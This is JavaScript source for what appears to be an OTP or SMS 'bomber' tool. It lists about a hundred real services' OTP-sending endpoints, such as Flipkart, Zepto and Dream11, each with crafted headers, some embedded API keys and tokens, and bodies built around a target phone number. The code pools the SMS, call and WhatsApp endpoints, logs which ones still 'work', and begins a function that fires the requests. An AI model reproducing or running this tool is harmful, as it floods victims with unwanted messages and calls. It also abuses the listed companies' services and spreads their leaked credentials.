// ❌ Purana (galat):
const isAlive = response.status < 500;

// ✅ Naya (sahi):
if (response.status >= 200 && response.status < 300) {
    // TRULY WORKING — OTP bhej diya
} else if (response.status === 429) {
    // RATE LIMITED — working hai but thoda ruko
} else if (response.status >= 400 && response.status < 500) {
    // REJECTED — payload/token wrong (fixable)
} else {
    // SERVER DOWN
}
    },
    {
        name: "Dream11_WA",
        url: "https://www.dream11.com/auth/passwordless/init",
        method: "POST",
        headers: { "accept": "application/json", "content-type": "application/json", "device": "pwa" },
        body_type: "json",
        body: (no) => ({ channel: "sms", flow: "SIGNUP", phoneNumber: no, templateName: "default" }),
        type: "WHATSAPP"
    },
    {
        name: "MYMA_WA",
        url: "https://portal.myma.in/custom-api/auth/generateotp",
        method: "POST",
        headers: { "accept": "application/json", "content-type": "application/json" },
        body_type: "json",
        body: (no) => ({ countrycode: "+91", mobile: "91" + no, is_otpgenerated: false, app_version: "-1" }),
        type: "WHATSAPP"
    },
    {
        name: "Freedo_WA",
        url: "https://api.freedo.rentals/customer/sendOtpForSignUp",
        method: "POST",
        headers: { "accept": "*/*", "content-type": "application/json", "platform": "web", "x-channel": "WEB", "x-client-id": "FREEDO" },
        body_type: "json",
        body: (no) => ({ email_id: `user${no.slice(-4)}@gmail.com`, first_name: "User", mobile_number: no }),
        type: "WHATSAPP"
    },
    {
        name: "Cosmofeed_WA",
        url: "https://prod.api.cosmofeed.com/api/user/authenticate",
        method: "POST",
        headers: { "accept": "application/json", "content-type": "application/json" },
        body_type: "json",
        body: (no) => ({ phoneNumber: no, countryCode: "+91", data: { email: "user@gmail.com" }, authScreen: "signup-screen" }),
        type: "WHATSAPP"
    },
    {
        name: "EvitalRX_WA",
        url: "https://www.evitalrx.in:4000/v3/login/signup_sendotp",
        method: "POST",
        headers: { "Accept": "application/json", "Content-Type": "application/json" },
        body_type: "json",
        body: (no) => ({ pharmacy_name: "pharma", mobile: no, email_id: `user${no.slice(-4)}@gmail.com`, zip_code: "110086" }),
        type: "WHATSAPP"
    },
    {
        name: "QuickRide_WA",
        url: "https://pwa.getquickride.com/rideMgmt/probableuser/create/new",
        method: "POST",
        headers: { "APP-TOKEN": "s16-q9fz-jy3p-rk", "Content-Type": "application/x-www-form-urlencoded" },
        body_type: "form",
        body: (no) => ({ contactNo: no, countryCode: "+91", appName: "Quick Ride" }),
        type: "WHATSAPP"
    },
    {
        name: "Clovia_WA",
        url: "https://www.clovia.com/api/v4/signup/check-existing-user/?phone={no}&isSignUp=true&is_otp=True",
        method: "GET",
        headers: { "accept": "application/json" },
        body_type: "none",
        body: () => null,
        type: "WHATSAPP"
    },
    {
        name: "KwikFix_WA",
        url: "https://admin.kwikfixauto.in/api/auth/signupotp/",
        method: "POST",
        headers: { "accept": "application/json", "content-type": "application/json" },
        body_type: "json",
        body: (no) => ({ phone: no }),
        type: "WHATSAPP"
    },
    {
        name: "Brevistay_WA",
        url: "https://www.brevistay.com/cst/app-api/login",
        method: "POST",
        headers: { "accept": "application/json", "content-type": "application/json", "brevi-channel": "DESKTOP_WEB" },
        body_type: "json",
        body: (no) => ({ is_otp: 1, is_password: 0, mobile: no }),
        type: "WHATSAPP"
    },
    {
        name: "HourlyRooms_WA",
        url: "https://web-api.hourlyrooms.co.in/api/signup/sendphoneotp",
        method: "POST",
        headers: { "Accept": "*/*", "content-type": "application/json", "platform": "web-2.0.0" },
        body_type: "json",
        body: (no) => ({ phone: no }),
        type: "WHATSAPP"
    },
    {
        name: "MadrasMandi_WA",
        url: "https://api.madrasmandi.in/api/v1/auth/otp",
        method: "POST",
        headers: { "accept": "application/json", "content-type": "multipart/form-data", "mm-device-type": "web" },
        body_type: "form",
        body: (no) => ({ phone: "+91" + no, scope: "client" }),
        type: "WHATSAPP"
    },
    {
        name: "BharatLoan_WA",
        url: "https://www.bharatloan.com/login-sbm",
        method: "POST",
        headers: { "Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest" },
        body_type: "form",
        body: (no) => ({ mobile: no, current_page: "login", is_existing_customer: "2" }),
        type: "WHATSAPP"
    },
    {
        name: "Pagarbook_WA",
        url: "https://api.pagarbook.com/api/v5/auth/otp/request",
        method: "POST",
        headers: { "accept": "application/json", "appversioncode": "5268", "clientplatform": "WEB", "content-type": "application/json", "userrole": "EMPLOYER" },
        body_type: "json",
        body: (no) => ({ phone: no, language: 1 }),
        type: "WHATSAPP"
    },
    {
        name: "Vahak_WA",
        url: "https://api.vahak.in/v1/u/o_w",
        method: "POST",
        headers: { "accept": "application/json", "content-type": "application/json" },
        body_type: "json",
        body: (no) => ({ phone_number: no, scope: 0, is_whatsapp: false }),
        type: "WHATSAPP"
    },
    {
        name: "Ixigo_WA",
        url: "https://www.ixigo.com/api/v5/oauth/dual/mobile/send-otp",
        method: "POST",
        headers: { "accept": "*/*", "apikey": "ixiweb!2$", "clientid": "ixiweb", "content-type": "application/x-www-form-urlencoded" },
        body_type: "form",
        body: (no) => ({ sixDigitOTP: "true", prefix: "+91", phone: no }),
        type: "WHATSAPP"
    },
    {
        name: "55Club_WA",
        url: "https://api.55clubapi.com/api/webapi/SmsVerifyCode",
        method: "POST",
        headers: { "accept": "application/json", "content-type": "application/json" },
        body_type: "json",
        body: (no) => ({ phone: "91" + no, codeType: 1, language: 0 }),
        type: "WHATSAPP"
    },
    {
        name: "Zerodha_WA",
        url: "https://zerodha.com/account/registration.php",
        method: "POST",
        headers: { "accept": "*/*", "content-type": "application/json" },
        body_type: "json",
        body: (no) => ({ mobile: no, source: "zerodha", partner_id: "" }),
        type: "WHATSAPP"
    },
    {
        name: "Aakash_ANTHE_WA",
        url: "https://antheapi.aakash.ac.in/api/generate-lead-otp",
        method: "POST",
        headers: { "accept": "*/*", "content-type": "application/json", "x-client-id": "a6fbf1d2-27c3-46e1-b149-0380e506b763" },
        body_type: "json",
        body: (no) => ({ mobile_psid: no, mobile_number: "", activity_type: "aakash-myadmission" }),
        type: "WHATSAPP"
    },
    {
        name: "Testbook_WA",
        url: "https://api.testbook.com/api/v2/mobile/signup?mobile={no}&clientId=1117490662.1715447223",
        method: "POST",
        headers: { "accept": "application/json", "content-type": "application/json", "x-tb-client": "web,1.2" },
        body_type: "json",
        body: (no) => ({ firstVisitSource: { type: "organic" }, mobile: no, signupDetails: { page: "HomePage" } }),
        type: "WHATSAPP"
    },
    {
        name: "MediBuddy_WA",
        url: "https://loginprod.medibuddy.in/unified-login/user/register",
        method: "POST",
        headers: { "accept": "application/json", "content-type": "application/json" },
        body_type: "json",
        body: (no) => ({ source: "medibuddyInWeb", platform: "medibuddy", phonenumber: no, flow: "Retail-Login-Home-Flow" }),
        type: "WHATSAPP"
    },
    {
        name: "Beyoung_WA",
        url: "https://www.beyoung.in/api/sendOtp.json",
        method: "POST",
        headers: { "accept": "application/json", "content-type": "application/json", "access-token": "JQ0fUq6r6dhzJHRLSdn3J6kyzNXumrEM9gy+q8456XEsQISIKfb31Wiyx/VhM84NYcBLGRVjXeU4GqYWDAJpwQ==" },
        body_type: "json",
        body: (no) => ({ username: no, username_type: "mobile", service_type: 0 }),
        type: "WHATSAPP"
    },
    {
        name: "Wrogn_WA",
        url: "https://omqkhavcch.execute-api.ap-south-1.amazonaws.com/simplyotplogin/v5/otp",
        method: "POST",
        headers: { "accept": "*/*", "action": "sendOTP", "content-type": "application/json", "shop_name": "wrogn-website.myshopify.com" },
        body_type: "json",
        body: (no) => ({ username: "+91" + no, type: "mobile", domain: "wrogn.com" }),
        type: "WHATSAPP"
    },
    {
        name: "MedKart_WA",
        url: "https://app.medkart.in/api/v1/auth/requestOTP",
        method: "POST",
        headers: { "accept": "application/json", "app-platform": "web", "content-type": "application/json" },
        body_type: "json",
        body: (no) => ({ mobile_no: no }),
        type: "WHATSAPP"
    },
    {
        name: "MamaEarth_WA",
        url: "https://auth.mamaearth.in/v1/auth/initiate-signup",
        method: "POST",
        headers: { "accept": "*/*", "content-type": "application/json", "isweb": "true" },
        body_type: "json",
        body: (no) => ({ mobile: no, referralCode: "" }),
        type: "WHATSAPP"
    },
    {
        name: "Coverfox_WA",
        url: "https://www.coverfox.com/otp/send/",
        method: "POST",
        headers: { "accept": "*/*", "content-type": "application/x-www-form-urlencoded", "x-requested-with": "XMLHttpRequest" },
        body_type: "form",
        body: (no) => ({ contact: no }),
        type: "WHATSAPP"
    },
    {
        name: "WoodenStreet_WA",
        url: "https://www.woodenstreet.com/index.php?route=account/forgotten_popup",
        method: "POST",
        headers: { "accept": "*/*", "content-type": "application/x-www-form-urlencoded", "x-requested-with": "XMLHttpRequest" },
        body_type: "form",
        body: (no) => ({ telephone: no, pincode: "110086", city: "DELHI", state: "DELHI", email: "user@gmail.com" }),
        type: "WHATSAPP"
    },
    {
        name: "GoMechanic_WA",
        url: "https://gomechanic.app/api/v2/send_otp",
        method: "POST",
        headers: { "Authorization": "725ea1b774c3558a8ec01a8405334a6e50e1e822d9549d84b36a1d3bb9478a27", "Content-Type": "application/json" },
        body_type: "json",
        body: (no) => ({ number: no, source: "website", random_id: "K6z9b" }),
        type: "WHATSAPP"
    },
    {
        name: "LoveLocal_WA",
        url: "https://homedeliverybackend.mpaani.com/auth/send-otp",
        method: "POST",
        headers: { "accept": "application/json", "client-code": "vulpix", "content-type": "application/json" },
        body_type: "json",
        body: (no) => ({ phone_number: no, role: "CUSTOMER" }),
        type: "WHATSAPP"
    },
    {
        name: "Tyreplex_WA",
        url: "https://www.tyreplex.com/includes/ajax/gfend.php",
        method: "POST",
        headers: { "Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest" },
        body_type: "form",
        body: (no) => ({ perform_action: "sendOTP", mobile_no: no, action_type: "order_login" }),
        type: "WHATSAPP"
    },
    {
        name: "Moglix_WA",
        url: "https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
        method: "POST",
        headers: { "accept": "application/json", "content-type": "application/json" },
        body_type: "json",
        body: (no) => ({ email: "", phone: no, type: "p", source: "signup" }),
        type: "WHATSAPP"
    },
    {
        name: "UpGrad_WA",
        url: "https://prod-auth-api.upgrad.com/apis/auth/v5/registration/phone",
        method: "POST",
        headers: { "accept": "application/json", "client": "web", "content-type": "application/json" },
        body_type: "json",
        body: (no) => ({ phoneNumber: "+91" + no }),
        type: "WHATSAPP"
    },
    {
        name: "PinkNBlu_WA",
        url: "http://www.pinknblu.com/v1/auth/generate/otp",
        method: "POST",
        headers: { "Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest" },
        body_type: "form",
        body: (no) => ({ country_code: "+91", phone: no }),
        type: "WHATSAPP"
    },
    {
        name: "Udaan_WA",
        url: "https://auth.udaan.com/api/otp/send?client_id=udaan-v2",
        method: "POST",
        headers: { "accept": "*/*", "content-type": "application/x-www-form-urlencoded", "x-app-id": "udaan-auth" },
        body_type: "form",
        body: (no) => ({ mobile: no }),
        type: "WHATSAPP"
    },
    {
        name: "Xylem_WA",
        url: "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348",
        method: "POST",
        headers: { "Accept": "application/json", "Authorization": "Bearer", "Content-Type": "application/json", "client-id": "64254d66be2a390018e6d348", "client-type": "WEB" },
        body_type: "json",
        body: (no) => ({ mobile: no, countryCode: "+91", firstName: "User" }),
        type: "WHATSAPP"
    },
    {
        name: "NoBroker_WA",
        url: "https://www.nobroker.in/api/v1/account/user/otp/send?otpM=true",
        method: "POST",
        headers: { "accept": "*/*", "content-type": "application/x-www-form-urlencoded" },
        body_type: "form",
        body: (no) => ({ phone: "+91" + no }),
        type: "WHATSAPP"
    },
    {
        name: "Vidyakul_WA",
        url: "https://vidyakul.com/signup-otp/send",
        method: "POST",
        headers: { "accept": "application/json", "content-type": "application/x-www-form-urlencoded", "x-requested-with": "XMLHttpRequest" },
        body_type: "form",
        body: (no) => ({ phone: no }),
        type: "WHATSAPP"
    },
    {
        name: "Vedantu_WA",
        url: "https://user.vedantu.com/user/preLoginVerification",
        method: "POST",
        headers: { "accept": "*/*", "content-type": "application/json" },
        body_type: "json",
        body: (no) => ({ phoneCode: "+91", phoneNumber: no, sType: "VEDANTU_F_7_N", version: 2, whatsappCommunicationEnabled: false }),
        type: "WHATSAPP"
    },
    {
        name: "Spotify_WA",
        url: "https://accounts.spotify.com/api/v1/login/phone",
        method: "POST",
        headers: { "accept": "application/json", "content-type": "application/x-www-form-urlencoded" },
        body_type: "form",
        body: (no) => ({ phonenumber: "+91" + no, version: "2" }),
        type: "WHATSAPP"
    },
    {
        name: "Unacademy_WA",
        url: "https://unacademy.com/api/v3/user/user_check/?enable-email=true",
        method: "POST",
        headers: { "accept": "*/*", "content-type": "application/json", "x-platform": "0" },
        body_type: "json",
        body: (no) => ({ phone: no, country_code: "IN", otp_type: 1, send_otp: true }),
        type: "WHATSAPP"
    },
    {
        name: "Myntra_WA",
        url: "https://www.myntra.com/gateway/v1/auth/getotp",
        method: "POST",
        headers: { "accept": "*/*", "content-type": "application/json", "x-myntraweb": "Yes" },
        body_type: "json",
        body: (no) => ({ phoneNumber: no, signup: "ONECLICK" }),
        type: "WHATSAPP"
    },
    {
        name: "Meesho_WA",
        url: "https://www.meesho.com/api/v1/user/login/request-otp",
        method: "POST",
        headers: { "accept": "application/json", "content-type": "application/json", "meesho-iso-country-code": "IN" },
        body_type: "json",
        body: (no) => ({ phone_number: no }),
        type: "WHATSAPP"
    },
    {
        name: "Flipkart_WA",
        url: "https://2.rome.api.flipkart.com/api/7/user/otp/generate",
        method: "POST",
        headers: { "accept": "*/*", "content-type": "application/json" },
        body_type: "json",
        body: (no) => ({ loginId: "+91" + no }),
        type: "WHATSAPP"
    },
    {
        name: "PWStore_WA",
        url: "https://api.penpencil.co/v1/users/get-otp",
        method: "POST",
        headers: { "accept": "application/json", "content-type": "application/json", "client": "hasura", "client_type": "WEB", "suborgid": "SUB-PWST002" },
        body_type: "json",
        body: (no) => ({ username: no, countryCode: "+91", organizationId: "5eb393ee95fab7468a79d189" }),
        type: "WHATSAPP"
    },
    {
        name: "HDFCErgo_WA",
        url: "https://here.co.in/users/v1/customer-portal/send-otp",
        method: "POST",
        headers: { "accept": "application/json", "content-type": "application/json", "x-api-client": "Website" },
        body_type: "json",
        body: (no) => ({ mobile: no, source: "sms" }),
        type: "WHATSAPP"
    },
    {
        name: "AstroTalk_WA",
        url: "https://api.prod.astrotalk.in/AstroTalk/v2/login/user/mobile-otp-login",
        method: "POST",
        headers: { "accept": "application/json" },
        body_type: "json",
        body: (no) => ({ countryCode: "91", isCall: "false", appId: "4", businessId: "1", mobile: no }),
        type: "WHATSAPP"
    },
    {
        name: "AstroYogi_WA",
        url: "https://chang.astroyogi.com/api/UserAccountV2/WebGenerateOtpV3",
        method: "POST",
        headers: { "accept": "application/json", "content-type": "application/json" },
        body_type: "json",
        body: (no) => ({ PhoneNumber: no, PhoneCode: "91", Domain: "Web", CountryId: "IN" }),
        type: "WHATSAPP"
    },
    {
        name: "BigBasket_WA",
        url: "https://www.bigbasket.com/member-tdl/v3/member/otp",
        method: "POST",
        headers: { "accept": "application/json", "content-type": "application/json", "x-channel": "BB-WEB", "x-caller": "Monster-SVC" },
        body_type: "json",
        body: (no) => ({ identifier: no, referrer: "unified_login" }),
        type: "WHATSAPP"
    },
    {
        name: "Naaptol_WA",
        url: "https://www.naaptol.com/faces/jsp/ajax/ajax.jsp",
        method: "POST",
        headers: { "accept": "application/json", "content-type": "application/x-www-form-urlencoded", "x-requested-with": "XMLHttpRequest" },
        body_type: "json",
        body: (no) => ({ actionname: "checkMobileUserExistsForTvApp", mobile: no }),
        type: "WHATSAPP"
    },
    {
        name: "IndiaMart_WA",
        url: "https://m.indiamart.com/ajaxrequest/identified/common/login",
        method: "POST",
        headers: { "accept": "*/*", "content-type": "application/json" },
        body_type: "json",
        body: (no) => ({ ph_code: "91", use: no }),
        type: "WHATSAPP"
    },
    {
        name: "Ajio_WA",
        url: "https://login.web.ajio.com/api/auth/signupSendOTP",
        method: "POST",
        headers: { "accept": "application/json", "content-type": "application/json" },
        body_type: "json",
        body: (no) => ({ firstName: "User", genderType: "Male", login: "user@gmail.com", mobileNumber: no, requestType: "SENDOTP" }),
        type: "WHATSAPP"
    },
    {
        name: "RelianceRetail_WA",
        url: "https://api.account.relianceretail.com/service/application/retail-auth/v2.0/send-otp",
        method: "POST",
        headers: { "accept": "application/json", "content-type": "application/json" },
        body_type: "json",
        body: (no) => ({ mobile: no }),
        type: "WHATSAPP"
    },
    {
        name: "Snapdeal_WA",
        url: "https://www.snapdeal.com/isUserExists",
        method: "POST",
        headers: { "accept": "*/*", "content-type": "application/json", "x-requested-with": "XMLHttpRequest" },
        body_type: "json",
        body: (no) => ({ userName: no }),
        type: "WHATSAPP"
    },
    {
        name: "1mg_WA",
        url: "https://www.1mg.com/pwa-dweb-api/auth/create_token",
        method: "POST",
        headers: { "accept": "application/json", "content-type": "application/json", "x-access-key": "1mg_client_access_key", "x-platform": "desktop-0.0.1" },
        body_type: "json",
        body: (no) => ({ phone: no }),
        type: "WHATSAPP"
    },
    {
        name: "ApolloPharmacy_WA",
        url: "https://apigateway.apollo247.in/auth-service/generateOtp",
        method: "POST",
        headers: { "accept": "application/json", "content-type": "application/json", "x-app-os": "web" },
        body_type: "json",
        body: (no) => ({ loginType: "PATIENT", mobileNumber: "+91" + no }),
        type: "WHATSAPP"
    },
    {
        name: "Blinkit_WA",
        url: "https://blinkit.com/v2/accounts/",
        method: "POST",
        headers: { "accept": "*/*", "app_client": "consumer_web", "content-type": "application/x-www-form-urlencoded", "platform": "mobile_web" },
        body_type: "form",
        body: (no) => ({ user_phone: no }),
        type: "WHATSAPP"
    },
    {
        name: "CityMallWeb_WA",
        url: "https://citymall.live/web-api/auth/send-otp",
        method: "POST",
        headers: { "accept": "application/json", "content-type": "application/json" },
        body_type: "json",
        body: (no) => ({ phone_number: no }),
        type: "WHATSAPP"
    },
    {
        name: "Apna_WA",
        url: "https://production.apna.co/api/userprofile/v1/otp/",
        method: "POST",
        headers: { "accept": "application/json", "content-type": "application/json" },
        body_type: "json",
        body: (no) => ({ phone_number: "91" + no, retries: 0, hash_type: "employer", source: "employer" }),
        type: "WHATSAPP"
    },
    {
        name: "Lenskart_WA",
        url: "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        method: "POST",
        headers: { "accept": "*/*", "content-type": "application/json", "x-api-client": "desktop" },
        body_type: "json",
        body: (no) => ({ phoneCode: "+91", telephone: no }),
        type: "WHATSAPP"
    },
    {
        name: "Shopsy_WA",
        url: "https://www.shopsy.in/1.rome/api/1/action/view",
        method: "POST",
        headers: { "accept": "application/json", "content-type": "application/json", "x-partner-context": '{"source":"reseller"}' },
        body_type: "json",
        body: (no) => ({ actionRequestContext: { loginIdPrefix: "+91", loginId: no } }),
        type: "WHATSAPP"
    },
    {
        name: "Smytten_WA",
        url: "https://route.smytten.com/",
        method: "POST",
        headers: { "accept": "application/json", "content-type": "application/json", "request_type": "web" },
        body_type: "json",
        body: (no) => ({ guest_user_access: true, value: no }),
        type: "WHATSAPP"
    },
    {
        name: "OLX_WA",
        url: "https://www.olx.in/api/auth/authenticate?lang=en-IN",
        method: "POST",
        headers: { "accept": "*/*", "content-type": "application/json" },
        body_type: "json",
        body: (no) => ({ grantType: "phone", phone: "+91" + no, language: "en-IN" }),
        type: "WHATSAPP"
    },
    {
        name: "Upstox_WA",
        url: "https://service.upstox.com/login/open/v9/auth/1fa/otp/generate",
        method: "POST",
        headers: { "accept": "*/*", "content-type": "application/json" },
        body_type: "json",
        body: (no) => ({ data: { mobileNumber: no } }),
        type: "WHATSAPP"
    },
    {
        name: "PolicyBazaar_WA",
        url: "https://myaccount.policybazaar.com/myacc/login/generateToken",
        method: "POST",
        headers: { "accept": "*/*", "content-type": "application/json", "x-client-source": "PBHOME_MYACC" },
        body_type: "json",
        body: (no) => ({ source: "MYACC", MobileNo: no }),
        type: "WHATSAPP"
    },
    {
        name: "5Paisa_WA",
        url: "https://kycapi.5paisa.com/auth/otp/generate",
        method: "POST",
        headers: { "accept": "application/json", "content-type": "application/json" },
        body_type: "json",
        body: (no) => ({ loginType: "SMS", mobileNo: no, appSource: "NEWWEB" }),
        type: "WHATSAPP"
    },
    {
        name: "BookMyShow_WA",
        url: "https://in.bookmyshow.com/api/members/otp/send",
        method: "POST",
        headers: { "accept": "application/json", "content-type": "application/json", "x-app-code": "WEB" },
        body_type: "json",
        body: (no) => ({ channel: "phone", subChannel: "sms", details: { phone: no, isdCountryCode: "IN", isdCode: "+91" } }),
        type: "WHATSAPP"
    },
    {
        name: "MakeMyTrip_WA",
        url: "https://mapi.makemytrip.com/ext/web/pwa/send/token/SIGNUP_OTP?region=in&currency=inr",
        method: "POST",
        headers: { "accept": "application/json", "content-type": "application/json", "user-country": "IN", "user-currency": "INR" },
        body_type: "json",
        body: (no) => ({ countryCode: "91", loginId: no, type: 6 }),
        type: "WHATSAPP"
    },
    {
        name: "Scaler_WA",
        url: "https://www.scaler.com/users/v2/",
        method: "POST",
        headers: { "accept": "application/json", "content-type": "application/json", "app-name": "desktop" },
        body_type: "json",
        body: (no) => ({ type: "school_of_tech", user: { phone_number: "+91-" + no, whatsapp_consent: "whatsapp_consent_yes" } }),
        type: "WHATSAPP"
    },
    {
        name: "Navi_WA",
        url: "https://navi.com/pl/api/web/otp/v1/generate",
        method: "POST",
        headers: { "accept": "application/json", "content-type": "application/json", "x-platform": "WEB" },
        body_type: "json",
        body: (no) => ({ deliveryType: "TEXT", recipient: no, resend: false }),
        type: "WHATSAPP"
    },
    {
        name: "KreditBee_WA",
        url: "https://api.kreditbee.in/v1/me/otp",
        method: "PUT",
        headers: { "accept": "application/json", "content-type": "application/json" },
        body_type: "json",
        body: (no) => ({ mobile: no, reason: "loginOrRegister" }),
        type: "WHATSAPP"
    },
    {
        name: "Housing_WA",
        url: "https://mightyzeus-mum.housing.com/api/gql?apiName=LOGIN_SEND_OTP_API",
        method: "POST",
        headers: { "accept": "*/*", "content-type": "application/json", "app-name": "desktop_web_buyer" },
        body_type: "json",
        body: (no) => ({ query: "mutation($phone: String) { sendOtp(phone: $phone) { success } }", variables: { phone: no } }),
        type: "WHATSAPP"
    },
    {
        name: "99Acres_WA",
        url: "https://www.99acres.com/api-aggregator/auth/login/generate-otp?version2=true",
        method: "POST",
        headers: { "accept": "application/json", "content-type": "application/json", "platform": "desktop" },
        body_type: "json",
        body: (no) => ({ countryCode: "91", mobile: "91-" + no, mode: "LOGIN_GENERATE", platform: "desktop" }),
        type: "WHATSAPP"
    },
    {
        name: "CarWale_WA",
        url: "https://www.carwale.com/api/user/login/otp-request/",
        method: "POST",
        headers: { "accept": "*/*", "content-type": "application/json" },
        body_type: "json",
        body: (no) => ({ mobileNo: no, sourceModule: 14 }),
        type: "WHATSAPP"
    },
    {
        name: "Zepto_WA",
        url: "https://bff-gateway.zepto.com/api/v1/user/customer/send-otp-sms/",
        method: "POST",
        headers: { "accept": "application/json", "content-type": "application/json", "app_sub_platform": "WEB", "platform": "WEB", "tenant": "ZEPTO" },
        body_type: "json",
        body: (no) => ({ mobileNumber: no, countryCode: "+91" }),
        type: "WHATSAPP"
    },
    {
        name: "Hyperpure_WA",
        url: "https://api.hyperpure.com/api/verifyUser?phoneNumber={no}",
        method: "GET",
        headers: { "accept": "application/json", "apptype": "mweb", "x-client": "consumer" },
        body_type: "none",
        body: () => null,
        type: "WHATSAPP"
    },
    {
        name: "Hotstar_WA",
        url: "https://www.hotstar.com/api/internal/bff/v2/pages/1/spaces/1/widgets/8?action=sendOtp",
        method: "POST",
        headers: { "accept": "application/json", "content-type": "application/json", "x-hs-platform": "web" },
        body_type: "json",
        body: (no) => ({ body: { "@type": "type.googleapis.com/feature.login.InitiatePhoneLoginRequest", phone_number: no } }),
        type: "WHATSAPP"
    },
    {
        name: "PWRegister2_WA",
        url: "https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189?smsType=0",
        method: "POST",
        headers: { "accept": "*/*", "content-type": "application/json", "randomid": "e66d7f5b-7963-408e-9892-839015a9c83f" },
        body_type: "json",
        body: (no) => ({ mobile: no, countryCode: "+91", subOrgId: "SUB-PWLI000" }),
        type: "WHATSAPP"
    },
    {
        name: "Bisleri2_WA",
        url: "https://apis.bisleri.com/send-otp",
        method: "POST",
        headers: { "Accept": "application/json", "Content-Type": "application/json", "x-requested-with": "7Yhm6b86qTsrpcMWtUixPLnv02nHf3wFf5vkukwu" },
        body_type: "json",
        body: (no) => ({ email: `user${no.slice(-4)}@gmail.com`, mobile: no }),
        type: "WHATSAPP"
    },
    {
        name: "Licious2_WA",
        url: "https://www.licious.in/api/login/signup",
        method: "POST",
        headers: { "accept": "*/*", "content-type": "application/json", "serverside": "false" },
        body_type: "json",
        body: (no) => ({ phone: no, captcha_token: null }),
        type: "WHATSAPP"
    },
    {
        name: "GoPaySense2_WA",
        url: "https://api.gopaysense.com/users/otp",
        method: "POST",
        headers: { "accept": "*/*", "content-type": "application/json" },
        body_type: "json",
        body: (no) => ({ phone: no }),
        type: "WHATSAPP"
    },
    {
        name: "Moglix2_WA",
        url: "https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
        method: "POST",
        headers: { "accept": "application/json", "content-type": "application/json" },
        body_type: "json",
        body: (no) => ({ email: "", phone: no, type: "p", source: "signup", buildVersion: "DESKTOP-7.3", device: "desktop" }),
        type: "WHATSAPP"
    },
    {
        name: "UpGrad2_WA",
        url: "https://prod-auth-api.upgrad.com/apis/auth/v5/registration/phone",
        method: "POST",
        headers: { "accept": "application/json", "client": "web", "content-type": "application/json" },
        body_type: "json",
        body: (no) => ({ phoneNumber: "+91" + no }),
        type: "WHATSAPP"
    },
    {
        name: "PinkNBlu2_WA",
        url: "http://www.pinknblu.com/v1/auth/generate/otp",
        method: "POST",
        headers: { "Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest" },
        body_type: "form",
        body: (no) => ({ _token: "HvvCsMqCY6poDB4GYPd2DJxewZ6H6TWPMHt8hfEV", country_code: "+91", phone: no }),
        type: "WHATSAPP"
    },
    {
        name: "Udaan2_WA",
        url: "https://auth.udaan.com/api/otp/send?client_id=udaan-v2",
        method: "POST",
        headers: { "accept": "*/*", "content-type": "application/x-www-form-urlencoded", "x-app-id": "udaan-auth" },
        body_type: "form",
        body: (no) => ({ mobile: no }),
        type: "WHATSAPP"
    },
    {
        name: "Xylem2_WA",
        url: "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348",
        method: "POST",
        headers: { "Accept": "application/json", "Authorization": "Bearer", "Content-Type": "application/json", "client-id": "64254d66be2a390018e6d348", "client-type": "WEB" },
        body_type: "json",
        body: (no) => ({ mobile: no, countryCode: "+91", firstName: "Anant Ambani" }),
        type: "WHATSAPP"
    },
    {
        name: "NoBroker2_WA",
        url: "https://www.nobroker.in/api/v1/account/user/otp/send?otpM=true",
        method: "POST",
        headers: { "accept": "*/*", "content-type": "application/x-www-form-urlencoded" },
        body_type: "form",
        body: (no) => ({ phone: "+91" + no }),
        type: "WHATSAPP"
    },
    {
        name: "Tyreplex2_WA",
        url: "https://www.tyreplex.com/includes/ajax/gfend.php",
        method: "POST",
        headers: { "Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest" },
        body_type: "form",
        body: (no) => ({ perform_action: "sendOTP", mobile_no: no, action_type: "order_login" }),
        type: "WHATSAPP"
    }
];

// ============================================================
// ===== COMBINE ALL APIS =====
// ============================================================

const ALL_APIS = [...SMS_APIS, ...CALL_APIS, ...WHATSAPP_APIS];

const NORMAL_APIS = ALL_APIS.filter(a => !a.rateLimit);
const RATE_LIMIT_APIS = ALL_APIS.filter(a => a.rateLimit);

console.log(`✅ Loaded ${ALL_APIS.length} total APIs`);
console.log(`   📱 SMS: ${SMS_APIS.length}`);
console.log(`   📞 CALL: ${CALL_APIS.length}`);
console.log(`   💬 WHATSAPP: ${WHATSAPP_APIS.length}`);

// ============================================================
// ===== STATS & LOGGING =====
// ============================================================

const stats = {};
const recentLogs = [];
const MAX_LOGS = 300;

ALL_APIS.forEach(api => {
    stats[api.name] = { name: api.name, type: api.type, total: 0, success: 0, failed: 0, lastStatus: null, lastStatusCode: null, lastTime: null, lastError: null, avgResponseTime: 0 };
});

function logEvent(msg, type = 'info') {
    const emoji = { info: 'ℹ️', success: '✅', error: '❌', warn: '⚠️' }[type] || 'ℹ️';
    console.log(`${emoji} [${new Date().toISOString().slice(11, 19)}] ${msg}`);
    recentLogs.push({ time: new Date().toISOString(), type, msg });
    if (recentLogs.length > MAX_LOGS) recentLogs.shift();
}

function recordResult(apiName, success, statusCode, responseTime, error = null) {
    const s = stats[apiName];
    if (!s) return;
    s.total++;
    if (success) { s.success++; s.lastStatus = 'WORKING'; }
    else { s.failed++; s.lastStatus = 'FAILED'; }
    s.lastStatusCode = statusCode;
    s.lastTime = new Date().toISOString();
    s.lastError = error;
    s.avgResponseTime = s.avgResponseTime === 0 ? responseTime : Math.round((s.avgResponseTime * (s.total - 1) + responseTime) / s.total);
}

// ============================================================
// ===== API CALL FUNCTION =====
// ============================================================

async function makeApiCall(api, phone, retryCount = 0) {
    const startTime = Date.now();
    try {
        let url = api.url;
        if (typeof url === 'function') url = url(phone);
        url = url.replace(/{no}/g, phone);

        const headers = { ...(api.headers || {}) };
        delete headers['content-length'];
        delete headers['Content-Length'];
        delete headers['host'];
        delete headers['Host'];

        let data = null;
        let params = null;
        let isForm = false;

        if (api.params) {
            params = typeof api.params === 'function' ? api.params(phone) : api.params;
        }

        if (api.body && api.body_type !== 'none') {
            if (typeof api.body === 'function') {
